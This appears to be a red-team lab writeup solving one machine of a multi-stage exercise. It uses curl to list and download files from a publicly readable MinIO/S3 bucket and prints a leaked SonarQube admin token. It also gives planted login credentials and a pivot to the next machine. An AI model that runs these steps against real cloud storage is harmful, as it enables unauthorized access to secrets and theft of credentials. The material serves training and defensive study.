# solve_red.md — M3 · dev-artifacts
## Red Team Solution Writeup
**Machine:** M3 — PUL Build Artifact Store
**Vulnerability:** Public S3 Bucket ACL Misconfiguration
**MITRE:** T1530 (Data from Cloud Storage Object)

---
## Objective
Using MinIO credentials from M2 (pul-build-svc:Artf@ct5tr!PUL24), access the PUL Build Artifact Store. Discover that the `pul-code-reports` bucket has a public-read ACL — listable and downloadable WITHOUT credentials. Find and download `sonarqube-access.env` containing the SonarQube admin token.

---
## Step-by-Step

### Step 1 — Discover Service
```bash
curl -s http://11.x.x.x:9000/pul-code-reports/ | head -30
```
No auth header sent — server returns S3 XML listing (bucket is public).


<img width="2002" height="321" alt="image" src="https://github.com/user-attachments/assets/8a1da7ac-7989-496d-95ec-d6336ab3a667" />



### Step 2 — List Public Bucket
```bash
curl -s "http://11.x.x.x:9000/pul-code-reports/?list-type=2"
```
XML response shows three objects including `sonar-integration/sonarqube-access.env`.

<img width="2004" height="264" alt="image" src="https://github.com/user-attachments/assets/01712ed8-f582-4336-b649-034bcdc52335" />


### Step 3 — Download Credential File
```bash
curl -s "http://11.x.x.x:9000/pul-code-reports/sonar-integration/sonarqube-access.env"
```
Output:
```
# PUL SonarQube Integration Credentials
SONAR_TOKEN=sqa_pul_admin_2024_gridfall
SONAR_HOST=11.x.x.x
SONAR_PORT=9200
SONAR_PROJECT_KEY=pul-firmware-ota
```

<img width="1023" height="309" alt="image" src="https://github.com/user-attachments/assets/8987f01e-b383-4442-8995-05e004c11355" />


### Step 4 — (Bonus) Login to Management UI
```bash
# Login with MinIO creds from M2 to see all buckets
# Browse: http://11.x.x.x:9000/login
# Username: pul-build-svc | Password: Artf@ct5tr!PUL24
```

<img width="1292" height="388" alt="image" src="https://github.com/user-attachments/assets/864a2047-574c-442b-995a-a6f809fc7dfa" />


**Pivot:** `sqa_pul_admin_2024_gridfall` → M4 SonarQube Code Intelligence (`11.x.x.x:9200`)
